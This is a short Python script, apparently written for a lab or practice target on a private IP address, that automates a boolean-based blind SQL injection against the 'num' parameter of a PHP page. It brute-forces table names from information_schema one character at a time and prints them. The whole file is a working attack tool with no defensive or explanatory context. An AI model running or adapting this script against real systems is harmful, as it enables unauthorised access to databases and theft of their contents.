import requests
from bs4 import BeautifulSoup

table = []
session = requests.session()
string = "abcdefghijklmnopqrstuvwxyz1234567890$_"

for i in  range(100):
    line=""
    for ii in range(1, 50):
        lineL = len(line)
        for x in string:
            login_url = f"http://192.168.10.4/web2/view.php?num=1' and substr((select table_name from information_schema.tables limit {i},1), {ii},1)='{x}' %23"
            res = session.get(login_url)
            if res.text.find("OK")>0:
                line+=x
                break
        if lineL == len(line):
            table.append(line)
            print(line)
            break
    